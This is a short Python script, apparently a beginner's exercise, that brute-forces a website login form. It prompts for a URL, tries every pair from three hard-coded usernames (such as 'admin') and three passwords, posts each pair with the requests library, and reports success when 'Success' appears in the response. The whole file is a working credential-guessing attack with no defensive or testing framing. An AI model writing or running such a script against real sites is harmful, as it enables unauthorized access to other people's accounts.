#Simple login bruteforce script using lists
import requests

url=input("Lets check website : ")

#using python inbuild list for wordlists
username = ("admin","admin1","admin11")
password = ("password","Pass","test")

for i in username:
    for j in password:
       credentials= {'username':i,'password':j}
       print ("Username: " + i + "\n Passowrd:" + j)
       #passing data using request post
       r = requests.post(url, data=credentials)
       #using request text to get responce text and searching for success keyword in responce body
       if "Success" in r.text:
        print ("login successfull")
       else : 
        print("lets try onemore time")
        
    
